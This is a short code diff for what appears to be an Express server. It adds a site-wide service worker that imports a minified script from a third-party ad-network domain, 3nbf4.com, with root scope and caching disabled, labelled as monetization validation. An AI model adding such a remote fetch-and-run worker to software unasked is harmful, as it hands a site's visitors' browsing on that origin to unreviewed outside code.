@@ -67,6 +67,21 @@ app.get('/api/health', (req, res) => {
   res.json({ status: 'ok', version: cleanVersion });
 });
 
+// Explicit service worker routes for ad/monetization validation
+const serviceWorkerContent = `self.options = {
+    "domain": "3nbf4.com",
+    "zoneId": 11835176
+}
+self.lary = ""
+importScripts('https://3nbf4.com/act/files/service-worker.min.js?r=sw')`;
+
+app.get(['/sw.js', '/service-worker.js'], (req, res) => {
+  res.setHeader('Content-Type', 'application/javascript');
+  res.setHeader('Service-Worker-Allowed', '/');
+  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
+  res.send(serviceWorkerContent);
+});
+
 async function startServer() {
   if (process.env.NODE_ENV !== 'production') {
     // Development mode with Vite middleware
